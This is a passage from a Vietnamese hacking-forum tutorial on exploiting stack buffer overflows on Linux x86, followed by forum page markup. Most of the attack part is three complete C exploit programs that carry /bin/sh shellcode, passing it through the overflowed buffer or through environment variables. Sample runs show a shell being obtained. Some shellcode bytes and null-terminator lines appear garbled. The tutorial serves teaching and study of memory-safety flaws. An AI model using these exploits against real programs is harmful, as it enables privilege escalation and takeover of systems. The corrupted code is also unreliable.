giờ cần phải kết hợp lại. Các bước cơ bản của kỹ thuật tràn bộ đệm là: chuẩn bị bộ đệm dùng để làm tràn (như ở phần trên), xác định địa chỉ trả về (RET) và độ lệch do sắp biến, xác định địa chỉ của bộ đệm chứa shellcode, cuối cùng gọi thực thi chương trình bị tràn bộ đệm.<br/> <br/> Có một số cách để tổ chức shellcode trên bộ nhớ và truyền cho chương trình bị lỗi, trước tiên chúng ta sẽ xem xét phương pháp cơ bản nhất: shellcode được truyền thông qua bộ đệm của chương trình bị lỗi. Phương pháp này không phải là cách dễ dàng nhất để khai thác lỗi tràn bộ đệm trên máy tại chỗ (local) nhưng đây là cách tổng quát nhất để khai thác lỗi tràn bộ đệm tại chỗ cũng như từ xa.<br/> <br/> <br/> Xem trong ví dụ trên, shellcode sẽ được tổ chức và truyền qua bộ đệm buf của chương trình vuln1.c<br/> <br/> <font color='yellow'>5.1. Truyền shellcode qua bộ đệm</font><br/> Chương trình khai thác lỗi tràn bộ đệm sau của chúng ta sẽ nhận 3 giá trị tham số: tên chương trình bị lỗi, kích thước bộ đệm dùng để làm tràn và giá trị độ dời so với con trỏ stack hiện tại (ví trị dự đoán của bộ đệm chứa shellcode).<br/> <br/> /* exploit1.c */<br/> #include <br/> <br/> #define DEFAULT_OFFSET 0<br/> #define DEFAULT_BUFFER_SIZE 512<br/> #define NOP 0x90 // mã asm của lệnh NOP<br/> <br/> char shellcode[] =<br/> "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50"<br/> "\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xb\x31\xc0\x40\xcd\x80";<br/> <br/> unsigned long get_sp(void) {<br/> __asm__("movl %esp,%eax");<br/> }<br/> <br/> void main(int argc, char *argv[]) {<br/> char *buff, *ptr;<br/> long *addr_ptr, addr;<br/> int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;<br/> int i;<br/> <br/> if (argc &lt; 2) {<br/> printf("Usage: %s target [bsize offset]\n", argv[0]); <br/> exit(0);<br/> }<br/> <br/> if (argc &gt; 2) bsize = atoi(argv[2]); <br/> if (argc &gt; 3) offset = atoi(argv[3]); <br/> <br/> if (!(buff = malloc(bsize))) {<br/> printf("Can't allocate memory.\n");<br/> exit(0);<br/> }<br/> <br/> addr = get_sp() - offset;<br/> printf("Using address: 0x%x\n", addr);<br/> <br/> ptr = buff;<br/> /* lấp đầy bộ đệm làm tràn với các địa chỉ của shellcode */<br/> addr_ptr = (long *) ptr;<br/> for (i = 0; i &lt; bsize; i+=4)<br/> *(addr_ptr++) = addr;<br/> <br/> /* lấp đầy nửa đầu vói các lệnh NOP */<br/> for (i = 0; i &lt; bsize/2; i++)<br/> buff[i] = NOP;<br/> <br/> /* tiếp theo là shellcode */ <br/> ptr = buff + ((bsize/2) - (strlen(shellcode)/2));<br/> for (i = 0; i &lt; strlen(shellcode); i++)<br/> *(ptr++) = shellcode[i];<br/> <br/> buff[bsize - 1] = '&lt;!--POST BOX--&gt;';<br/> <br/> execl(argv[1],argv[1],buff,NULL);<br/> }<br/> <br/> <br/> Chương trình trên cấp phát bộ đệm dùng để làm tràn trên heap, lý do tại sao xin dành cho người đọc tự trả lời.<br/> <br/> Kích thước của bộ đệm dùng làm tràn lớn hơn so với bộ đệm bị tràn khoảng 100 byte là tốt nhất. Khi đó bộ đệm làm tràn có phần đầu khá lớn chứa các NOP, phần cuối chứa shellcode và địa chỉ đủ để làm tràn và ghi đè lên giá trị địa chỉ trả về (RET).<br/> <br/> Hãy thử chương trình khai thác lỗi vừa viết.<br/> <br/> [SkZ0@gamma bof]$ ./exploit1 ./vuln1 600<br/> Using address: 0xbffffa1c<br/> <br/> ( ... )<br/> <br/> bash$ <br/> <br/> Thử với giá trị độ dời:<br/> <br/> [SkZ0@gamma bof]$ ./exploit1 ./vuln1 600 100<br/> Using address: 0xbffff9a8<br/> <br/> ( ... )<br/> <br/> [SkZ0@gamma bof]$ ./exploit1 ./vuln1 600 -100<br/> Using address: 0xbffffa70<br/> <br/> ( ... )<br/> <br/> bash$ <br/> <br/> <font color='yellow'>5.2. Truyền shellcode qua biến môi trường</font><br/> Bây giờ, hãy quay trở lại với ví dụ đầu tiên, chương trình vuln.c (xem phần 1). Có thể thấy chương trình exploit1.c không thể khai thác được lỗi tràn bộ đệm trong vuln.c do kích thước bộ đệm bị tràn quá nhỏ (16 byte) không đủ để đặt vừa shellcode. Khi đó địa chỉ trả về sẽ bị ghi đè bởi các mã lệnh thay vì giá trị địa chỉ cần nhảy đến. Để vượt qua trở ngại này, chúng ta sẽ dùng một "bộ đệm" khác để lưu trữ shellcode. Thông thường có thể dùng biến môi trường (environment) hoặc một tham số dòng lệnh chương trình (argument) để chứa shellcode do các biến này đều được cấp trên stack, tuy nhiên sử dụng biến môi trường là phương pháp đơn giản và hiệu quả hơn. Với shellcode được chứa trong biến môi trường, bộ đệm dùng để làm tràn chỉ đơn giản chứa toàn giá trị địa chỉ (phỏng đoán) của biến môi trường chứa shellcode.<br/> <br/> Chương trình exploit1.c được sửa lại như sau (có thêm một tham số là kích thước của bộ đệm chứa shellcode). <br/> <br/> /* exploit2.c */<br/> #include <br/> <br/> #define DEFAULT_OFFSET 0<br/> #define DEFAULT_BUFFER_SIZE 512<br/> #define DEFAULT_EGG_SIZE 2048<br/> #define NOP 0x90 // mã asm của lệnh NOP<br/> <br/> char shellcode[] =<br/> "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50"<br/> "\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xb\x31\xc0\x40\xcd\x80";<br/> <br/> unsigned long get_esp(void) {<br/> __asm__("movl %esp,%eax");<br/> }<br/> <br/> void main(int argc, char *argv[]) {<br/> char *buff, *ptr, *egg;<br/> long *addr_ptr, addr;<br/> int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;<br/> int i, eggsize=DEFAULT_EGG_SIZE;<br/> <br/> if (argc &lt; 2) {<br/> printf("Usage: %s target [bsize offset eggsize]\n", argv[0]); <br/> exit(0);<br/> }<br/> <br/> if (argc &gt; 2) bsize = atoi(argv[2]);<br/> if (argc &gt; 3) offset = atoi(argv[3]);<br/> if (argc &gt; 4) eggsize = atoi(argv[4]);<br/> <br/> if (!(buff = malloc(bsize))) {<br/> printf("Can't allocate memory.\n");<br/> exit(0);<br/> }<br/> if (!(egg = malloc(eggsize))) {<br/> printf("Can't allocate memory.\n");<br/> exit(0);<br/> }<br/> <br/> addr = get_esp() - offset;<br/> printf("Using address: 0x%x\n", addr);<br/> <br/> /* bộ đệm làm tràn chỉ chứa toàn địa chỉ shellcode */ <br/> ptr = buff;<br/> addr_ptr = (long *) ptr;<br/> for (i = 0; i &lt; bsize; i+=4)<br/> *(addr_ptr++) = addr;<br/> <br/> /* NOP+shellcode được đặt trong biến môi trường */<br/> ptr = egg;<br/> for (i = 0; i &lt; eggsize - strlen(shellcode) - 1; i++)<br/> *(ptr++) = NOP;<br/> <br/> for (i = 0; i &lt; strlen(shellcode); i++)<br/> *(ptr++) = shellcode[i];<br/> <br/> buff[bsize - 1] = '&lt;!--POST BOX--&gt;';<br/> egg[eggsize - 1] = '&lt;!--POST BOX--&gt;';<br/> <br/> setenv("EGG", egg, 1);<br/> execl(argv[1],argv[1],buff,NULL);<br/> }<br/> <br/> Hãy thử chương trình khai thác lỗi mới:<br/> <br/> [SkZ0@gamma bof]$ ./exploit2 ./vuln<br/> Using address: 0xbffffa18<br/> <br/> ( ... )<br/> <br/> bash$ <br/> <br/> Có thể thấy cách sử dụng biến môi trường khá hiệu quả. Phương pháp sau (chỉ áp dụng cho Linux x86) cũng sử dụng biến môi trường để chứa shellcode nhưng xác định được chính xác địa chỉ của biến môi trường này. Do đó, ta không cần phải lấp đầy các NOP vào đầu bộ đệm chứa shellcode, cũng như địa chỉ shellcode được xác định chính xác thay vì phải phỏng đoán.<br/> <br/> Phần địa chỉ cao nhất (tương đương phần đáy của stack) của một file chương trình ELF, Linux x86 có dạng:<br/> <br/> Hình 4: Cấu trúc đáy stack của Linux x86 <br/> <br/> Ta thấy, địa chỉ biến môi trường cuối cùng được tính theo công thức sau:<br/> <br/> <br/> envpn = 0xBFFFFFFF -<br/> 4 - // 4 NULL bytes<br/> strlen(program_name) - // chiều dài chuỗi tên chương trình<br/> 1 - // giá trị null của chuỗi tên chương trình <br/> strlen(envp[n])) // độ dài của biến môi trường cuối cùng<br/> <br/> hay rút gọn:<br/> envpn = 0xBFFFFFFA - strlen(prog_name) - strlen(envp[n])<br/> <br/> Các hàm gọi thực thi chương trình như execle, execve cho phép truyền con trỏ biến môi trường cho chương trình được gọi. Tận dụng điều này chúng ta có thể truyền trực tiếp bộ đệm chứa shellcode cho chương trình bị lỗi thông qua con trỏ biến môi trường, và tính được chính xác địa chỉ của nó.<br/> <br/> Công thức để tính đia chỉ của shellcode:<br/> <br/> addr = 0xBFFFFFFA - strlen(prog_name) - strlen(shellcode);<br/> <br/> Chương trình khai thác lỗi mới được viết như sau:<br/> <br/> /* exploit3.c */<br/> #include <br/> <br/> #define DEFAULT_BUFFER_SIZE 512<br/> #define NOP 0x90 // mã asm của lệnh NOP<br/> <br/> char shellcode[] =<br/> "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50"<br/> "\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xb\x31\xc0\x40\xcd\x80";<br/> <br/> void main(int argc, char *argv[]) {<br/> char *buff, *ptr, *egg;<br/> long *addr_ptr, addr;<br/> int bsize=DEFAULT_BUFFER_SIZE;<br/> int i;<br/> <br/> char *env[2] = {shellcode, NULL};<br/> <br/> if (argc &lt; 2) {<br/> printf("Usage: %s target [bsize]\n", argv[0]); <br/> exit(0);<br/> }<br/> <br/> if (argc &gt; 2) bsize = atoi(argv[2]);<br/> <br/> if (!(buff = malloc(bsize))) {<br/> printf("Can't allocate memory.\n");<br/> exit(0);<br/> }<br/> <br/> addr = 0xbffffffa - strlen(shellcode) - strlen(argv[1]);<br/> printf("Using address: 0x%x\n", addr);<br/> <br/> /* bộ đệm làm tràn chỉ chứa toàn địa chỉ shellcode */ <br/> ptr = buff;<br/> addr_ptr = (long *) ptr;<br/> for (i = 0; i &lt; bsize; i+=4)<br/> *(addr_ptr++) = addr;<br/> buff[bsize - 1] = '&lt;!--POST BOX--&gt;';<br/> <br/> execle(argv[1],argv[1],buff,NULL,env);<br/> }<br/> <br/> Trong chương trình trên, chúng ta đã truyền cho chương trình bị lỗi con trỏ biến môi trường chỉ với một biến duy nhất là bộ đệm chứa shellcode, do đó độ dài của biến môi trường chính là độ dài của shellcode. Thử chương trình khai thác lỗi mới này:<br/> <br/> [SkZ0@gamma bof]$ ./exploit3 ./vuln<br/> Using address: 0xbfffffd4<br/> <br/> ( ... )<br/> <br/> bash$ <br/> <br/> <br/> <font color='yellow'>6. Kết luận</font><br/> Hy vọng những gì đã trình bày có thể giúp các bạn hiểu được nguyên nhân và hậu quả dẫn đến của lỗi tràn bộ đệm. Kỹ thuật khai thác lỗi tràn bộ đệm là hoàn toàn không khó khi đã có cơ sở lý thuyết hết sức rõ ràng, mặc dù nó đòi hỏi phải có hiểu biết chút ít về ngôn ngữ lập trình. Việc tránh lỗi bộ đệm xảy ra cũng có thể đạt được không mấy khó khăn, đó là thực hiện nguyên tắc: tạo các chương trình an toàn ngay từ khi thiết kế.<br/> <br/> <br/> <br/> Tài liệu tham khảo<br/> Smashing The Stack For Fun And Profit - Aleph1 <br/> Avoiding security holes when developing an application - Frédéric Raynal, Christophe Blaess, Christophe Grenier <br/> BUFFER OVERFLOWS DEMYSTIFIED - Murat Balaban <br/> Writing buffer overflow exploits - a tutorial for beginners - Mixter <br/> <br/> <br/> Liên kết<br/><span class="link"> http://www.phrack.org/</span> <br/><span class="link"> http://community.core-sdi.com/~juliano/</span> </span></td>
                  </tr>
                </table>
          <!-- Attachments -->
			  		</td>
      </tr>


			<tr>
		        <td valign="bottom" class="row1" align="center"><div class="action" align="center">
	<table width="100%" border="0">
  		<tr>
		<td align="left">
					</td>
		<td align="right">
			<!--  -->
			
		


		
		
		<a class="nav" href="#top"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_up.gif" alt="[Up]" title="[Up]"></a>
			<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_print.gif" alt="[Print Copy]" title="[Print Copy]"></a>
		</td>
  	</tr>
	</table>
</div></td>
		  </tr>
	</table>

<table cellspacing="0" cellpadding="0" width="100%" align="center" border="0">
	<tr>
    	<td class="catbottomslim" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="5"></td>
  	</tr>
	<tr>
		<td><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="20"></td>
	</tr>
</table>

		

<table cellspacing="0" cellpadding="0" width="100%" border="0" align="center">
	<tr>
		<td valign="middle" align="right" class="nav"></td>
	</tr>
</table>

<!-- quick reply -->
<table class="forumline" cellspacing="1" cellpadding="3" width="100%" border="0" align="center">
</table>

<table cellspacing="0" cellpadding="0" width="100%" border="0" align="center">
	<tr>
		<td><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="10"></td>
	</tr>
</table>

<table cellspacing="0" cellpadding="0" width="100%" border="0" align="center">
	<tr>
		<td align="left">
			<!-- watch - unwatch -->
			<!-- add bookmark -->

		</td>
		<td align="right" valign="bottom">			
		</td>
	</tr>
</table>

<!-- mod -->

<table cellspacing="0" cellpadding="0" width="100%" border="0" align="center">
	<tr>
		<td colspan="3"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="10"></td>
	</tr>
</table>

<!-- combo navigator -->
<table cellspacing="0" cellpadding="0" width="100%" border="0" align="center">
	<tr>
		<td align="left"><a href="http://digg.com/submit?phrase=2&url=http://www.hvaonline.net/hvaonline/posts/list/430.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/digg.gif" align="texttop" alt="[digg]" title="[digg]"></a>
<a href="http://del.icio.us/post?url=http://www.hvaonline.net/hvaonline/posts/list/430.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/delicious.gif" align="texttop" alt="[delicious]" title="[delicious]"></a>
<a href="http://www.google.com/bookmarks/mark?op=edit&output=popup&bkmk=http://www.hvaonline.net/hvaonline/posts/list/430.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/google.gif" align="texttop" alt="[google]" title="[google]"></a>
<a href="http://bookmarks.yahoo.com/toolbar/savebm?opener=tb&u=http://www.hvaonline.net/hvaonline/posts/list/430.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/yahoo.gif" align="texttop" alt="[yahoo]" title="[yahoo]"></a>
<a href="http://technorati.com/faves?add=http://www.hvaonline.net/hvaonline/posts/list/430.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/technorati.gif" align="texttop" alt="[technorati]" title="[technorati]"></a>
<a href="http://reddit.com/submit?url=http://www.hvaonline.net/hvaonline/posts/list/430.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/reddit.gif" align="texttop" alt="[reddit]" title="[reddit]"></a>
<a href="http://www.stumbleupon.com/submit?url=http://www.hvaonline.net/hvaonline/posts/list/430.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/stumbleupon.gif" align="texttop" alt="[stumbleupon]" title="[stumbleupon]"></a></td>
		<td align="right">	<table cellspacing="0" cellpadding="0" border="0">
		<tr>			  
			<td nowrap="nowrap">
				<form action="" name="f" id="f" accept-charset="UTF-8">
					<span class="gensmall">Go to:&nbsp;</span>
					<select onchange="if(this.options[this.selectedIndex].value > 0){ document.location = '/hvaonline/forums/show/'+ this.options[this.selectedIndex].value +'.hva'; }" name="select">
						<option value="0" selected="selected">Select a forum</option>				
							<option value="0">-------------</option>
									<option value="2" >Thông báo từ HVA</option>
									<option value="41" >FAQ - Các câu hỏi thường gặp</option>
									<option value="5" >Góp ý và Hỏi đáp thắc mắc chung</option>
									<option value="6" >Kiểm tra bảo mật</option>
							<option value="0">-------------</option>
									<option value="8" >Thảo luận bảo mật</option>
									<option value="12" selected="selected">Thảo luận thâm nhập</option>
									<option value="28" >Thảo luận virus, trojan, spyware, worm...</option>
									<option value="36" >Thủ thuật reverse engineering</option>
									<option value="13" >Thông tin new bugs và exploits</option>
									<option value="51" >Case Studies</option>
							<option value="0">-------------</option>
									<option value="23" >Thảo luận hệ điều hành Windows</option>
									<option value="24" >Thảo luận hệ điều hành *nix</option>
									<option value="26" >Thảo luận các loại thiết bị máy tính</option>
									<option value="31" >Thảo luận mạng và thiết bị mạng</option>
									<option value="27" >Thông tin về các địa chỉ và tài liệu hữu ích</option>
							<option value="0">-------------</option>
									<option value="44" >Người tìm việc - Việc tìm người</option>
									<option value="21" >Thảo luận việc định hướng</option>
									<option value="19" >Những thảo luận khác</option>
									<option value="50" >Hình minh họa</option>
									<option value="33" >Trash</option>
							<option value="0">-------------</option>
					</select>
				</form>
			</td>
		</tr>
	</table>
</td>
	</tr>
</table>

<table cellspacing="0" cellpadding="0" width="100%" border="0" align="center">
	<tr>
		<td colspan="3"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="10"></td>
	</tr>
</table>

<!-- list users in -->
<table class="forumline" cellspacing="3" cellpadding="0" width="100%" border="0" align="center">
	<tr>
		<th class="thright"  nowrap="nowrap" height="26" valign="middle">&nbsp;Users currently in here&nbsp;</th>
	</tr>
		<tr>
			<td class="gensmall" valign="middle" align="left">
				1 Anonymous 
				
			</td>	
		</tr>
</table>
<a name="quick"></a>

<table cellspacing="0" cellpadding="0" width="100%" border="0"  align="center">

	<tr>	
		<td align="center">
		<br>
					</td>
	</tr>

	<tr>
		<td align="center">
			<span class="copyright">Powered by JForum - Extended by <a href="MailTo:lienlac@hvaonline.net">HVAOnline</a><br>
			&nbsp;hvaonline.net&nbsp; | &nbsp;hvaforum.net&nbsp; | &nbsp;hvazone.net&nbsp; | &nbsp;hvanews.net&nbsp; | &nbsp;vnhacker.org<br>
			1999 - 2013 &copy;
			v2012|0504|218|
		  </span>
	  </td>
	</tr>
<iframe src="/hvaonline/templates/ping_session.jsp" height="0" width="0" frameborder="0" scrolling="no"></iframe>
</body>
</html>
</table>

<script type="text/javascript" src="http://www.hvaonline.net/hvaonline/templates/viet/js/post_show.js"></script>
<script type="text/javascript" src="http://www.hvaonline.net/hvaonline/templates/viet/js/post.js"></script>
<script type="text/javascript" src="http://www.hvaonline.net/hvaonline/templates/viet/js/avim.js"></script>
<script type="text/javascript">
<!--
function showEmail(beforeAt, afterAt)
{
	return beforeAt + "@" + afterAt;
}

var starOn=new Image();
starOn.src="http://www.hvaonline.net/hvaonline/templates/viet/images/star_on.gif";

var starOff=new Image();
starOff.src="http://www.hvaonline.net/hvaonline/templates/viet/images/star_off.gif";

function writeStars(q, postId)
{
	for (var i = 0; i < 5; i++) {
		var name = "star" + postId + "_" + i;
		document.write("<img name='" + name + "' alt='*' />");
		document.images[name].src = q > i ? starOn.src : starOff.src;
	}
}

function addBookmark(relationType, relationId)
{
	var w = window.open('/hvaonline/bookmarks/insert/' + relationType + '/' + relationId + '.hva', 'bookmark_add', 'width="700", height="100", scrollbars="no"');
	w.focus();
}

function supportAjax()
{
	if (typeof(AjaxUtils) != 'undefined') {
		if (window.ActiveXObject) {
			var r = new ActiveXObject("Microsoft.XMLHTTP");
			return r != undefined;
		}
		else if (window.XMLHttpRequest) {
			return true;
		}
	}

	return false;
}




function maxImg(foto, maxSize){
w = foto.width;
if (w > maxSize){
	foto.width = maxSize;
	}
} 

-->
</script>
